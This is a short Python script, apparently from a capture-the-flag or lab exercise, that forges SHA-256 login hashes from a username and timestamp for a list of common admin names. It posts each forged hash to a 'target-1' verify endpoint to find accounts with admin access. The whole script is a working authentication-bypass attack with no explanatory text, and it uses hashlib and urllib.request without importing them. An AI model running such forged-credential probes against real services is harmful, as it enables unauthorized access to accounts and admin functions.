import urllib.parse

def get_hash(username, timestamp):
    return hashlib.sha256(f"{username}{timestamp}".encode()).hexdigest()

# Try common admin usernames
users = ["admin", "administrator", "root", "citrus", "oma", "system", "web", "www", "guest"]
timestamp = "1776963441"

print("Checking access levels for each user:")
for user in users:
    h = get_hash(user, timestamp)
    data = urllib.parse.urlencode({"username": user, "timestamp": timestamp, "hash": h}).encode()
    req = urllib.request.Request("http://target-1:80/verify", data=data, method="POST")
    try:
        response = urllib.request.urlopen(req)
        text = response.read().decode()
        if "Welcome" in text:
            # Extract the welcome message
            if "Access to restricted OMA admin functions denied" in text:
                print(f"  {user}: Regular user (admin access denied)")
            elif "Welcome" in text:
                # Check if they have admin access
                if "admin" in text.lower() and "Access" not in text:
                    print(f"  {user}: POTENTIAL ADMIN ACCESS")
                else:
                    print(f"  {user}: {text.split('class=\"info\">')[1].split('</div>')[0][:80]}")
    except Exception as e:
        print(f"  {user}: Error - {e}")
